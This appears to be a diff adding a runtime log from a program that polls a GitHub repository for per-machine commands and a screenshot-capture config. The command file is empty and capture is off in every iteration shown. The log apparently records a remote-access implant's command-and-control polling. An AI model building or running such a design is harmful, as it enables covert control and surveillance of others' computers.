{"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVCIHFD3OJA6RHP5BLKOEIWZAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:44.391] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:44.392] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:44.392] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:07:44.393] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:07:44.394] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:07:44.395] Processing screenshot config...
+[2026-08-04 03:07:44.396] [TRACE] handle_capture_settings: start
+[2026-08-04 03:07:44.397] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:07:44.975] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:07:44.976] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:07:44.977] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:07:44.978] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:07:44.979] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:07:44.980] Sleeping for 10 seconds...
+[2026-08-04 03:07:54.983] [TRACE] main loop: iteration start
+[2026-08-04 03:07:54.984] 
+--- POLL ITERATION START ---
+[2026-08-04 03:07:54.985] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:07:55.524] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:07:55.881] screenshots/config.json already exists
+[2026-08-04 03:07:56.883] Fetching path list from GitHub...
+[2026-08-04 03:07:56.884] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:07:56.885] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:07:57.407] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:57.408] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUVAUY37LNUV7GAVCDKOEIXTAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:57.408] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:57.409] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:57.410] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:07:58.411] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:07:58.769] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:07:58.770] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFSTTA2LJC5LDVR2RU3KOEIXXAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:07:58.771] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:07:58.772] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:07:58.773] [COMMANDS] Decoded content empty on attempt 2
